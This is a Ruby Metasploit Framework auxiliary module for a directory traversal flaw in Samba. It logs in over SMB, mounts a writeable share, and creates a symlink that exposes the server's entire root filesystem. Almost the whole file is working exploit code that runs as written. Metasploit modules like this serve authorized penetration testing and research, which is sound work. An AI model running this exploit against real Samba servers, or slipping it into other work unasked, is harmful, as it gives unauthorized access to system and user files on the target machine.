##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  # Exploit mixins should be called first
  include Msf::Exploit::Remote::SMB
  include Msf::Auxiliary::Report

  # Aliases for common classes
  SIMPLE = Rex::Proto::SMB::SimpleClient
  XCEPT  = Rex::Proto::SMB::Exceptions
  CONST  = Rex::Proto::SMB::Constants


  def initialize(info={})
    super(
        update_info(
            info,
            'Name'        => 'Samba Symlink Directory Traversal',
            'Description' => %Q{
              This module exploits a directory traversal flaw in the Samba
              CIFS server. To exploit this flaw, a writeable share must be specified.
              The newly created directory will link to the root filesystem.
            },
            'Author'      =>
                [
                    'kcope', # http://lists.grok.org.uk/pipermail/full-disclosure/2010-February/072927.html
                    'hdm'    # metasploit module
                ],
            'References'  =>
                [
                    ['OSVDB', '62145'],
                    ['URL', 'http://www.samba.org/samba/news/symlink_attack.html']
                ],
            'License'     => MSF_LICENSE
        )
    )

    register_options([
      OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server']),
      OptString.new('SMBTARGET', [true, 'The name of the directory that should point to the root filesystem', 'rootfs'])
    ], self.class)

  end


  def run
    print_status("Connecting to the server...")
    connect()
    smb_login()

    print_status("Trying to mount writeable share '#{datastore['SMBSHARE']}'...")
    self.simple.connect("\\\\#{rhost}\\#{datastore['SMBSHARE']}")

    print_status("Trying to link '#{datastore['SMBTARGET']}' to the root filesystem...")
    self.simple.client.symlink(datastore['SMBTARGET'], "../" * 10)

    print_status("Now access the following share to browse the root filesystem:")
    print_status("\t\\\\#{rhost}\\#{datastore['SMBSHARE']}\\#{datastore['SMBTARGET']}\\")
    print_line("")
  end

end
